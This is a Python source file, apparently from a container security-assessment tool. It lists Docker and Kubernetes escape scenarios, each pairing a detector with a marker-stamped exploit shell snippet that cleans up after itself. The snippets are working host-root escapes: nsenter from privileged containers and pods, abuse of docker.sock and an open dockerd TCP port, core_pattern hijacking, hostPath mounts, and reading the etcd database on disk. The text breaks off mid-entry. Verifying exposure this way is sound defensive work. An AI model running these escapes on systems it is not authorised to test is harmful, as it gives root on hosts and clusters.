"""The scenario registry — 37 Docker & Kubernetes escape conditions.

Each entry pairs a read-only DETECTOR (is this condition present on the node?) with a gated
EXPLOITER (demonstrate the documented escape, marker-stamped). Detectors are generalized to
scan the node's current state node-wide, not just a named lab artifact. Exploiters reuse the
techniques proven in the RavenSec engagement; the genuinely multi-step / offline-tooling ones
are detect-only (`PRECONDITION`), honoring the cyber_gate (no novel weaponization).

Source of truth: the docker-kube-datsu pack (arm/verify/proof per scenario) and the
validation report. Author: d3vn0mi (RavenSec).
"""
from __future__ import annotations

import re

from .context import Context, rbac_detector
from .model import Confidence as C, Detection, Kind, Repro, Scenario

# --- small helpers -----------------------------------------------------------------------

def _docker_any(jq_select: str) -> str:
    """sh snippet: exit 0 (and print matching container names) iff any running container matches."""
    return ("docker ps -q 2>/dev/null | xargs -r docker inspect 2>/dev/null | "
            f"jq -e -r '.[] | select({jq_select}) | .Name'")

def _pods_any(jq_select: str) -> str:
    return ("kubectl get pods -A -o json 2>/dev/null | "
            f"jq -e -r '.items[] | select({jq_select}) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")

_CAP = 'select((.HostConfig.CapAdd//[]) | map(ltrimstr("CAP_")) | index("{}"))'

def _ver_tuple(s: str):
    return tuple(int(x) for x in re.findall(r"\d+", s)[:3])

def _runc_below(fixed: str):
    def _fn(ctx: Context) -> Detection:
        if not ctx.have("runc"):
            return Detection(None, "runc binary not found on PATH")
        _rc, out = ctx.sh("runc --version")
        m = re.search(r"runc version ([0-9][0-9.]*)", out)
        if not m:
            return Detection(None, out.strip()[:120] or "could not parse runc --version")
        cur, fix = _ver_tuple(m.group(1)), _ver_tuple(fixed)
        return Detection(cur < fix, f"runc {m.group(1)} (fixed in >= {fixed})")
    return _fn

def _kernel_precondition(note: str):
    def _fn(ctx: Context) -> Detection:
        _rc, out = ctx.sh("uname -r")
        return Detection(None, f"kernel {out.strip()} — {note}")
    return _fn


# --- the registry ------------------------------------------------------------------------

SCENARIOS: list[Scenario] = [
    # ============================= Docker / host =============================
    Scenario("DK-01", Kind.DOCKER, Repro.CONFIG, "privileged container (docker run --privileged)",
        "CRITICAL", triage_ref="B1", confidence=C.CONCRETE,
        note="A --privileged container can nsenter the host init mount namespace and act as host root.",
        detect_sh=_docker_any(".HostConfig.Privileged==true"),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk01 --privileged alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk01 nsenter -t 1 -m -- sh -c "echo $MARKER > /root/.esc-dk01" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk01 2>/dev/null && ok=0\n'
            'docker rm -f esc-x-dk01 >/dev/null 2>&1; rm -f /root/.esc-dk01 2>/dev/null\n'
            'echo "host /root write via --privileged + nsenter -t1 ($MARKER)"; exit $ok')),

    Scenario("DK-02", Kind.DOCKER, Repro.CONFIG, "docker.sock bind-mounted into a container",
        "CRITICAL", triage_ref="C1", confidence=C.DOCUMENTED,
        note="A mounted docker.sock is root-on-host: ask the Engine API to start a second container with / mounted.",
        detect_sh=_docker_any('.Mounts[]? | .Source | test("docker\\\\.sock$")'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk02 -v /var/run/docker.sock:/run/docker.sock docker:cli sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk02 docker -H unix:///run/docker.sock run --rm -v /:/host alpine '
            'sh -c "echo $MARKER > /host/root/.esc-dk02" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk02 2>/dev/null && ok=0\n'
            'docker rm -f esc-x-dk02 >/dev/null 2>&1; rm -f /root/.esc-dk02 2>/dev/null\n'
            'echo "host write via mounted docker.sock Engine API ($MARKER)"; exit $ok')),

    Scenario("DK-03", Kind.DOCKER, Repro.CONFIG, "SYS_ADMIN + cgroup v1 release_agent breakout",
        "HIGH", triage_ref="B2", confidence=C.PRECONDITION,
        note="release_agent breakout needs cgroup v1; the host-overlay path discovery is storage-driver specific — not a safe single-shot (cyber_gate).",
        detect_sh=_docker_any(_CAP.format("SYS_ADMIN"))),

    Scenario("DK-04", Kind.DOCKER, Repro.CONFIG, "SYS_MODULE capability",
        "HIGH", triage_ref="B4", confidence=C.PRECONDITION,
        note="SYS_MODULE loads a kernel module, but proving it needs a module blob + compiler offline — out of scope for a bounded one-shot (cyber_gate).",
        detect_sh=_docker_any(_CAP.format("SYS_MODULE"))),

    Scenario("DK-05", Kind.DOCKER, Repro.CONFIG, "DAC_READ_SEARCH capability",
        "HIGH", triage_ref="B5", confidence=C.PRECONDITION,
        note="open_by_handle_at (shocker) PoC needs a compiled binary — not a bounded one-shot (cyber_gate).",
        detect_sh=_docker_any(_CAP.format("DAC_READ_SEARCH"))),

    Scenario("DK-06", Kind.DOCKER, Repro.CONFIG, "SYS_PTRACE + hostPID",
        "HIGH", triage_ref="B3", confidence=C.PRECONDITION,
        note="Docker-default AppArmor denies /proc/1/{environ,mem}; a genuine host-process read needs apparmor=unconfined too.",
        detect_sh=_docker_any('.HostConfig.PidMode=="host" and ((.HostConfig.CapAdd//[]) | map(ltrimstr("CAP_")) | index("SYS_PTRACE"))')),

    Scenario("DK-07", Kind.DOCKER, Repro.CONFIG, "sensitive bind mount (-v /:/host)",
        "HIGH", triage_ref="C2", confidence=C.CONCRETE,
        note="A container mounting host / can chroot in and write anywhere as root.",
        detect_sh=_docker_any('.Mounts[]? | .Source=="/"'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk07 -v /:/host alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk07 sh -c "echo $MARKER > /host/root/.esc-dk07" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk07 2>/dev/null && ok=0\n'
            'docker rm -f esc-x-dk07 >/dev/null 2>&1; rm -f /root/.esc-dk07 2>/dev/null\n'
            'echo "host write via -v /:/host ($MARKER)"; exit $ok')),

    Scenario("DK-08", Kind.DOCKER, Repro.CONFIG, "host device exposed (--device or /dev bind)",
        "HIGH", triage_ref="C4", confidence=C.DOCUMENTED,
        note="A raw host block device in the container is a full-disk read (and write) bypassing the fs boundary.",
        detect_sh=_docker_any("(.HostConfig.Devices//[]) | length > 0"),
        exploit_sh=(
            'dev=$(lsblk -dpno NAME 2>/dev/null | head -1); [ -n "$dev" ] || dev=/dev/vda\n'
            'docker run -d --rm --name esc-x-dk08 --device="$dev" alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'sig=$(docker exec esc-x-dk08 sh -c "dd if=$dev bs=512 count=64 2>/dev/null | od -An -c | tr -d \'\\n \' " 2>/dev/null)\n'
            'docker rm -f esc-x-dk08 >/dev/null 2>&1\n'
            'echo "read raw host device $dev from container ($MARKER); fs-magic sampled: ${sig#${sig%??????????}}"\n'
            '[ -n "$sig" ]')),

    Scenario("DK-09", Kind.DOCKER, Repro.CONFIG, "host network + IPC namespaces",
        "HIGH", triage_ref="C6", confidence=C.DOCUMENTED,
        note="--network=host --ipc=host exposes host-only listeners and SysV/POSIX shm to the container.",
        detect_sh=_docker_any('.HostConfig.NetworkMode=="host" and .HostConfig.IpcMode=="host"'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk09 --network=host --ipc=host alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'ports=$(docker exec esc-x-dk09 sh -c "cat /proc/net/tcp 2>/dev/null | awk \'{print \\$2}\' | grep -iE \':(1A85|1927)\' | head" )\n'
            'docker rm -f esc-x-dk09 >/dev/null 2>&1\n'
            'echo "host-only ports (6443/10250 hex) visible from container ($MARKER): ${ports:-none-seen}"\n'
            '[ -n "$ports" ]')),

    Scenario("DK-10", Kind.DOCKER, Repro.CONFIG, "seccomp unconfined",
        "HIGH", triage_ref="B8", confidence=C.DOCUMENTED,
        note="seccomp=unconfined removes the syscall filter — posture is confirmable; a syscall PoC needs a compiled probe.",
        detect_sh=_docker_any('(.HostConfig.SecurityOpt//[]) | index("seccomp=unconfined")'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk10 --security-opt seccomp=unconfined alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            's=$(docker exec esc-x-dk10 sh -c "grep Seccomp: /proc/self/status" 2>/dev/null)\n'
            'docker rm -f esc-x-dk10 >/dev/null 2>&1\n'
            'echo "seccomp filter disabled in container ($MARKER): $s"\n'
            'echo "$s" | grep -q "Seccomp:[[:space:]]*0"')),

    Scenario("DK-11", Kind.DOCKER, Repro.CONFIG, "no-new-privs off + setuid-root helper",
        "HIGH", triage_ref="B10", confidence=C.CONCRETE,
        note="Without no-new-privileges a setuid-root helper lets a non-root container user become root in-container.",
        detect_sh=('for c in $(docker ps -q 2>/dev/null); do '
                   'docker exec "$c" sh -c "find /usr/local /opt /home /srv -xdev -perm -4000 -type f 2>/dev/null" 2>/dev/null '
                   '| sed "s|^|$c:|"; done | grep .'),
        exploit_sh=(
            'docker run -d --rm --name esc-x-dk11 alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
            'docker exec esc-x-dk11 sh -c "cp /bin/busybox /usr/local/bin/esc-helper && chmod 4755 /usr/local/bin/esc-helper" >/dev/null 2>&1\n'
            'out=$(docker exec -u 1000 esc-x-dk11 /usr/local/bin/esc-helper id 2>/dev/null)\n'
            'docker rm -f esc-x-dk11 >/dev/null 2>&1\n'
            'echo "uid-1000 user -> root via setuid helper ($MARKER): $out"\n'
            'echo "$out" | grep -q "uid=0"')),

    Scenario("DK-12", Kind.DOCKER, Repro.CONFIG, "dockerd exposed on tcp/2375",
        "CRITICAL", triage_ref="C8", confidence=C.DOCUMENTED,
        note="An unauthenticated dockerd TCP socket is remote root: start a privileged container with host / mounted.",
        detect_sh="(ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | grep ':2375 '",
        exploit_sh=(
            'docker -H tcp://127.0.0.1:2375 run --rm -v /:/host alpine '
            'sh -c "echo $MARKER > /host/root/.esc-dk12" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk12 2>/dev/null && ok=0\n'
            'rm -f /root/.esc-dk12 2>/dev/null\n'
            'echo "host write via unauth dockerd tcp/2375 ($MARKER)"; exit $ok')),

    Scenario("DK-13", Kind.DOCKER, Repro.CONFIG, "lab user in the docker group",
        "HIGH", triage_ref="", confidence=C.CONCRETE,
        note="docker-group membership is root-equivalent; no triage check covers it (detection gap).",
        detect_sh="getent group docker 2>/dev/null | awk -F: '{print $4}' | tr ',' '\\n' | grep .",
        exploit_sh=(
            'u=$(getent group docker 2>/dev/null | awk -F: "{print \\$4}" | tr "," "\\n" | grep -v "^root$" | head -1)\n'
            '[ -n "$u" ] || { echo "no non-root docker-group member"; exit 1; }\n'
            'su - "$u" -c "docker run --rm -v /:/host alpine sh -c \'echo $MARKER > /host/root/.esc-dk13\'" >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk13 2>/dev/null && ok=0\n'
            'rm -f /root/.esc-dk13 2>/dev/null\n'
            'echo "host write as docker-group user $u ($MARKER)"; exit $ok')),

    Scenario("DK-14", Kind.DOCKER, Repro.CONFIG, "rshared bind-propagation mount",
        "MEDIUM", triage_ref="", confidence=C.PRECONDITION,
        note="The host-mount-escape via rshared propagation is a multi-step race with no safe single-shot command.",
        detect_sh=_docker_any('.Mounts[]? | .Propagation=="rshared"')),

    Scenario("DK-15", Kind.DOCKER, Repro.CONFIG, "core_pattern redirected to a handler",
        "HIGH", triage_ref="C3", confidence=C.DOCUMENTED,
        note="A pipe core_pattern runs a handler as host root on any crash — a privileged container can set it.",
        detect_sh="grep '^|' /proc/sys/kernel/core_pattern",
        exploit_sh=(
            'orig=$(cat /proc/sys/kernel/core_pattern)\n'
            'printf "#!/bin/sh\\necho $MARKER > /root/.esc-dk15\\n" > /tmp/.esc-dk15-h && chmod +x /tmp/.esc-dk15-h\n'
            'docker run --rm --privileged alpine sh -c "echo \'|/tmp/.esc-dk15-h\' > /proc/sys/kernel/core_pattern" >/dev/null 2>&1\n'
            'docker run --rm alpine sh -c "ulimit -c unlimited; kill -SEGV \\$\\$" >/dev/null 2>&1; sleep 2\n'
            'ok=1; grep -q "$MARKER" /root/.esc-dk15 2>/dev/null && ok=0\n'
            'echo "$orig" > /proc/sys/kernel/core_pattern 2>/dev/null; rm -f /root/.esc-dk15 /tmp/.esc-dk15-h 2>/dev/null\n'
            'echo "container-set core_pattern ran a host-root handler ($MARKER)"; exit $ok')),

    Scenario("DK-16", Kind.DOCKER, Repro.VERSION, "runc Leaky Vessels (fd leak via WORKDIR trick)",
        "HIGH", triage_ref="A2", detect_fn=_runc_below("1.1.12"),
        note="CVE-2024-21626 — fixed in runc 1.1.12."),

    Scenario("DK-17", Kind.DOCKER, Repro.VERSION, "runc 2025 maskedPaths/procfs race family",
        "HIGH", triage_ref="A3", detect_fn=_runc_below("1.2.8"),
        note="2025 maskedPaths/procfs race family — fixed in runc 1.2.8."),

    Scenario("DK-18", Kind.DOCKER, Repro.VERSION, "kernel LPE from an unprivileged container",
        "HIGH", triage_ref="A1", detect_fn=_kernel_precondition("verify against the published kernel-LPE advisory floor (placeholder in the pack)")),

    # ============================= Kubernetes =============================
    Scenario("K8-01", Kind.K8S, Repro.CONFIG, "ServiceAccount bound to a Role granting create pods",
        "CRITICAL", triage_ref="D1", confidence=C.DOCUMENTED,
        note="create-pods lets a token schedule a privileged hostPath pod and nsenter the node.",
        detect_fn=rbac_detector("create", "pods", "SA can create pods"),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k801 --image=alpine --restart=Never --overrides='
            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["nsenter","-t","1","-m","--","sh","-c","echo \'"$MARKER"\' > /root/.esc-k801; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k801 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-k801 2>/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1; rm -f /root/.esc-k801 2>/dev/null\n'
            'echo "privileged hostPID pod nsenter-wrote host /root ($MARKER)"; exit $ok')),

    Scenario("K8-02", Kind.K8S, Repro.CONFIG, "privileged pod",
        "CRITICAL", triage_ref="D2", confidence=C.CONCRETE,
        note="A privileged pod is node root via nsenter into host PID 1.",
        detect_sh=_pods_any("[.spec.containers[]?,.spec.initContainers[]?] | any(.securityContext.privileged==true)"),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k802 --image=alpine --restart=Never --privileged --overrides='
            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["nsenter","-t","1","-m","--","sh","-c","echo \'"$MARKER"\' > /root/.esc-k802; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k802 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-k802 2>/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1; rm -f /root/.esc-k802 2>/dev/null\n'
            'echo "privileged pod -> host /root via nsenter ($MARKER)"; exit $ok')),

    Scenario("K8-03", Kind.K8S, Repro.CONFIG, "hostPath mount of /",
        "CRITICAL", triage_ref="D2", confidence=C.CONCRETE,
        note="A pod mounting host / reads and writes the node filesystem directly.",
        detect_sh=_pods_any('.spec.volumes[]? | .hostPath.path=="/"'),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x apply -f - >/dev/null 2>&1 <<EOF\n'
            'apiVersion: v1\nkind: Pod\nmetadata: {name: esc-x-k803, namespace: esc-x}\n'
            'spec:\n  containers:\n  - {name: c, image: alpine, command: ["sh","-c","echo $MARKER > /host/root/.esc-k803; sleep 20"], volumeMounts: [{name: h, mountPath: /host}]}\n'
            '  volumes: [{name: h, hostPath: {path: /}}]\nEOF\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k803 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; grep -q "$MARKER" /root/.esc-k803 2>/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1; rm -f /root/.esc-k803 2>/dev/null\n'
            'echo "hostPath / pod wrote node /root ($MARKER)"; exit $ok')),

    Scenario("K8-04", Kind.K8S, Repro.CONFIG, "hostPID/hostNetwork/hostIPC pod",
        "HIGH", triage_ref="D2", confidence=C.DOCUMENTED,
        note="Host namespaces expose the node process table / network / IPC to the pod.",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and (.spec.hostPID==true or .spec.hostNetwork==true or .spec.hostIPC==true)'),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k804 --image=alpine --restart=Never --overrides='
            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["sh","-c","ps -o pid,comm 2>/dev/null | grep -w 1; sleep 20"]}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k804 --timeout=60s >/dev/null 2>&1\n'
            'out=$(kubectl -n esc-x logs esc-x-k804 2>/dev/null)\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "hostPID pod sees node PID 1 ($MARKER): $out"\n'
            'echo "$out" | grep -qiE "systemd|init|k3s"')),

    Scenario("K8-05", Kind.K8S, Repro.CONFIG, "privileged DaemonSet",
        "HIGH", triage_ref="D7", confidence=C.DOCUMENTED,
        note="A privileged DaemonSet lands on every node and can read the raw node disk / SA tokens.",
        detect_sh="kubectl get ds -A -o json 2>/dev/null | jq -e -r '.items[] | select(.spec.template.spec.containers[]?.securityContext.privileged==true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'",
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k805 --image=alpine --restart=Never --privileged --overrides='
            '\'{"spec":{"containers":[{"name":"c","image":"alpine","command":["sh","-c","d=$(ls /dev/sda1 /dev/vda1 2>/dev/null|head -1); dd if=$d bs=1024 count=2 2>/dev/null | od -An -c | head -1; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k805 --timeout=60s >/dev/null 2>&1\n'
            'out=$(kubectl -n esc-x logs esc-x-k805 2>/dev/null)\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "privileged pod read raw node disk ($MARKER): $out"\n'
            '[ -n "$out" ]')),

    Scenario("K8-06", Kind.K8S, Repro.CONFIG, "kubelet :10250 anonymous-auth",
        "HIGH", triage_ref="D4", confidence=C.DOCUMENTED,
        note="Anonymous kubelet on :10250 serves /pods (and exec) without auth.",
        detect_sh='code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 https://127.0.0.1:10250/pods 2>/dev/null); echo "kubelet /pods -> $code"; [ "$code" = 200 ]',
        exploit_sh='out=$(curl -sk --max-time 4 https://127.0.0.1:10250/pods 2>/dev/null | head -c 200); echo "anon kubelet /pods ($MARKER): $out"; echo "$out" | grep -q "PodList"'),

    Scenario("K8-07", Kind.K8S, Repro.CONFIG, "namespace without PSA enforce=restricted",
        "HIGH", triage_ref="D3", confidence=C.DOCUMENTED,
        note="A namespace not enforcing Pod Security 'restricted' will admit a privileged pod.",
        detect_sh="kubectl get ns -o json 2>/dev/null | jq -e -r '.items[] | select(.metadata.name|startswith(\"kube-\")|not) | select((.metadata.labels[\"pod-security.kubernetes.io/enforce\"]//\"\")!=\"restricted\") | .metadata.name'",
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k807 --image=alpine --restart=Never --privileged --command -- sleep 20 >/dev/null 2>&1\n'
            'ok=1; kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k807 --timeout=40s >/dev/null 2>&1 && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "privileged pod admitted + Running in a non-restricted ns ($MARKER)"; exit $ok')),

    Scenario("K8-08", Kind.K8S, Repro.CONFIG, "NET_RAW ARP/DNS spoof between co-located pods",
        "MEDIUM", triage_ref="", confidence=C.DOCUMENTED,
        note="Pods retaining NET_RAW on a shared pod network can ARP/DNS-spoof each other (no triage check).",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and ([.spec.containers[]?.securityContext.capabilities.drop//[] | .[]] | any(.=="ALL" or .=="NET_RAW") | not)'),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k808a --image=nicolaka/netshoot --restart=Never --command -- sleep 120 >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k808b --image=nicolaka/netshoot --restart=Never --command -- sleep 120 >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k808a pod/esc-x-k808b --timeout=90s >/dev/null 2>&1\n'
            'ip=$(kubectl -n esc-x get pod esc-x-k808b -o jsonpath="{.status.podIP}" 2>/dev/null)\n'
            'out=$(kubectl -n esc-x exec esc-x-k808a -- arping -c2 -w3 "$ip" 2>/dev/null | tr "\\n" " ")\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "NET_RAW L2 probe pod-a -> pod-b $ip ($MARKER): $out"\n'
            'echo "$out" | grep -qi "reply"')),

    Scenario("K8-09", Kind.K8S, Repro.CONFIG, "embedded etcd read bypassing RBAC",
        "CRITICAL", triage_ref="D14", confidence=C.DOCUMENTED,
        note="Root on the node can read Secrets straight from the on-disk etcd db, bypassing RBAC.",
        detect_sh='f=/var/lib/rancher/k3s/server/db/etcd/member/snap/db; test -r "$f" && echo "readable etcd db: $f"',
        exploit_sh=(
            'f=/var/lib/rancher/k3s/server/db/etcd/member/snap/db\n'
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x create secret generic esc-x-k809 --from-literal=canary=$MARKER >/dev/null 2>&1; sleep 2\n'
            'ok=1; strings "$f" 2>/dev/null | grep -q "$MARKER" && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "Secret canary read in cleartext from on-disk etcd ($MARKER)"; exit $ok')),

    Scenario("K8-10", Kind.K8S, Repro.CONFIG, "static-pod manifest directory writable",
        "HIGH", triage_ref="D8", confidence=C.DOCUMENTED,
        note="A world-writable k3s manifests dir auto-applies any dropped manifest as cluster root.",
        detect_sh='d=/var/lib/rancher/k3s/server/manifests; test -d "$d" && { p=$(stat -c "%a" "$d"); echo "$d $p"; [ $(( 0$p & 022 )) -ne 0 ]; }',
        exploit_sh=(
            'd=/var/lib/rancher/k3s/server/manifests; [ -d "$d" ] || exit 1\n'
            'cat > "$d/esc-x-k810.yaml" <<EOF\n'
            'apiVersion: v1\nkind: Namespace\nmetadata: {name: esc-x-k810, labels: {marker: "$MARKER"}}\nEOF\n'
            'sleep 6; ok=1; kubectl get ns esc-x-k810 >/dev/null 2>&1 && ok=0\n'
            'rm -f "$d/esc-x-k810.yaml" 2>/dev/null; kubectl delete ns esc-x-k810 --wait=false >/dev/null 2>&1\n'
            'echo "dropped manifest auto-applied by k3s as root ($MARKER)"; exit $ok')),

    Scenario("K8-11", Kind.K8S, Repro.CONFIG, "node admin kubeconfig left group/world-readable",
        "HIGH", triage_ref="D9", confidence=C.DOCUMENTED,
        note="A readable /etc/rancher/k3s/k3s.yaml is cluster-admin for any local user.",
        detect_sh='f=/etc/rancher/k3s/k3s.yaml; test -f "$f" && { p=$(stat -c "%a" "$f"); echo "$f $p"; [ $(( 0$p & 044 )) -ne 0 ]; }',
        exploit_sh=(
            'f=/etc/rancher/k3s/k3s.yaml; [ -r "$f" ] || exit 1\n'
            'out=$(KUBECONFIG="$f" kubectl auth can-i "*" "*" --all-namespaces 2>/dev/null)\n'
            'echo "cluster-admin via world-readable kubeconfig ($MARKER): can-i *.*=$out"\n'
            'echo "$out" | grep -qx yes')),

    Scenario("K8-12", Kind.K8S, Repro.CONFIG, "apiserver anonymous-auth",
        "CRITICAL", triage_ref="D4", confidence=C.DOCUMENTED,
        note="Anonymous apiserver lets system:anonymous reach the API (impact depends on anon RBAC).",
        detect_sh='code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 https://127.0.0.1:6443/api 2>/dev/null); echo "apiserver /api (anon) -> $code"; [ "$code" = 200 ]',
        exploit_sh='out=$(curl -sk --max-time 4 https://127.0.0.1:6443/api 2>/dev/null | head -c 160); echo "anon apiserver discovery ($MARKER): $out"; echo "$out" | grep -q "APIVersions"'),

    Scenario("K8-13", Kind.K8S, Repro.CONFIG, "system:anonymous bound to a ClusterRole",
        "CRITICAL", triage_ref="D1", confidence=C.CONCRETE,
        note="Any binding to system:anonymous grants unauthenticated cluster access.",
        detect_sh="kubectl get clusterrolebindings,rolebindings -A -o json 2>/dev/null | jq -e -r '.items[] | select(.subjects[]? | .name==\"system:anonymous\") | .metadata.name'",
        exploit_sh=(
            'out=$(kubectl --as=system:anonymous get pods -A -o name 2>/dev/null | head -1)\n'
            'echo "anonymous cluster read ($MARKER): ${out:-none}"\n'
            '[ -n "$out" ]')),

    Scenario("K8-14", Kind.K8S, Repro.CONFIG, "ServiceAccount can create PersistentVolumes (hostPath)",
        "HIGH", triage_ref="D1", confidence=C.DOCUMENTED,
        note="create-persistentvolumes lets a token map the node filesystem into the cluster via a hostPath PV.",
        detect_fn=rbac_detector("create", "persistentvolumes", "SA can create PersistentVolumes"),
        exploit_sh=(
            'kubectl apply -f - >/dev/null 2>&1 <<EOF\n'
            'apiVersion: v1\nkind: PersistentVolume\nmetadata: {name: esc-x-k814, labels: {marker: "$MARKER"}}\n'
            'spec:\n  capacity: {storage: 1Gi}\n  accessModes: [ReadWriteOnce]\n  hostPath: {path: /}\nEOF\n'
            'ok=1; kubectl get pv esc-x-k814 -o jsonpath="{.spec.hostPath.path}" 2>/dev/null | grep -qx / && ok=0\n'
            'kubectl delete pv esc-x-k814 --wait=false >/dev/null 2>&1\n'
            'echo "hostPath PV mapping node / created ($MARKER)"; exit $ok')),

    Scenario("K8-15", Kind.K8S, Repro.CONFIG, "ServiceAccount can create pods/ephemeralcontainers",
        "HIGH", triage_ref="D11", confidence=C.DOCUMENTED,
        note="ephemeralcontainers injection drops a debug container into a running pod (exec foothold).",
        detect_fn=rbac_detector("create", "pods/ephemeralcontainers", "SA can create pods/ephemeralcontainers"),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k815 --image=alpine --restart=Never --command -- sleep 120 >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k815 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; kubectl -n esc-x debug esc-x-k815 --image=alpine --target=esc-x-k815 -- sh -c "echo $MARKER" >/dev/null 2>&1 \\\n'
            '  && kubectl -n esc-x get pod esc-x-k815 -o json 2>/dev/null | jq -e ".spec.ephemeralContainers|length>0" >/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "ephemeral/debug container injected into a running pod ($MARKER)"; exit $ok')),

    Scenario("K8-16", Kind.K8S, Repro.CONFIG, "ClusterRole grants escalate/bind",
        "HIGH", triage_ref="D12", confidence=C.DOCUMENTED,
        note="escalate/bind on roles lets a principal self-grant any ClusterRole, defeating RBAC.",
        detect_sh="kubectl get clusterroles -o json 2>/dev/null | jq -e -r '.items[] | select(.rules[]? | ((.resources[]?|test(\"clusterroles|roles\")) and (.verbs[]?|test(\"^(escalate|bind)$\")))) | .metadata.name'",
        exploit_sh=(
            'r=$(kubectl get clusterroles -o json 2>/dev/null | jq -r \'.items[] | select(.rules[]? | ((.resources[]?|test("clusterroles|roles")) and (.verbs[]?|test("^(escalate|bind)$")))) | .metadata.name\' | head -1)\n'
            'echo "ClusterRole granting escalate/bind present ($MARKER): ${r:-none} — a bound principal can self-grant cluster-admin"\n'
            '[ -n "$r" ]')),

    Scenario("K8-17", Kind.K8S, Repro.CONFIG, "Secrets stored unencrypted in etcd",
        "MEDIUM", triage_ref="D10", confidence=C.DOCUMENTED,
        note="k3s without --secrets-encryption stores Secrets as cleartext in etcd (pairs with K8-09).",
        detect_sh='line=$(ps -eo args 2>/dev/null | grep -E "[k]3s server" | head -1); [ -n "$line" ] || exit 1; echo "$line" | grep -q -- --secrets-encryption && exit 1; echo "k3s server running without --secrets-encryption"',
        exploit_sh=(
            'f=/var/lib/rancher/k3s/server/db/etcd/member/snap/db\n'
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x create secret generic esc-x-k817 --from-literal=canary=$MARKER >/dev/null 2>&1; sleep 2\n'
            'ok=1; strings "$f" 2>/dev/null | grep -q "$MARKER" && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "Secret stored in cleartext in etcd (no encryption-at-rest) ($MARKER)"; exit $ok')),

    Scenario("K8-18", Kind.K8S, Repro.VERSION, "pidfd FD-steal (seccomp unset + namespace not Restricted)",
        "HIGH", triage_ref="D13", detect_fn=_kernel_precondition("pidfd FD-steal (CVE-2026-46333) needs a vulnerable kernel — verify against the advisory")),

    Scenario("K8-NA", Kind.K8S, Repro.NA, "cloud IMDS (169.254.169.254) — not present on Proxmox",
